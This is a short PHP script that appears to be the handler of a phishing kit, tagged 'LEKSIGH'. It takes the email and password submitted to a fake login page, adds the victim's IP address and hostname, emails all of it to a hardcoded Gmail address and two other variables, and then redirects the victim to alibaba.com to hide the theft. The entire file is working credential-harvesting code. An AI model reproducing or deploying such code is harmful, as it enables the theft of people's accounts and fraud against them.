<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "==================+[ LEKSIGH ]+==================\n";
$message .= "Username  : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "=============+ Created in 2015 By LEKSIGH +=============\n";

$send= "Mariapaul2222@gmail.com";

$subject = "Product | Pro | $ip";
$headers = "From:  LEKSIGH";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
mail($domain,$subject,$message,$headers);
mail($vps,$subject,$message,$headers);

header("Location: http://alibaba.com");
?>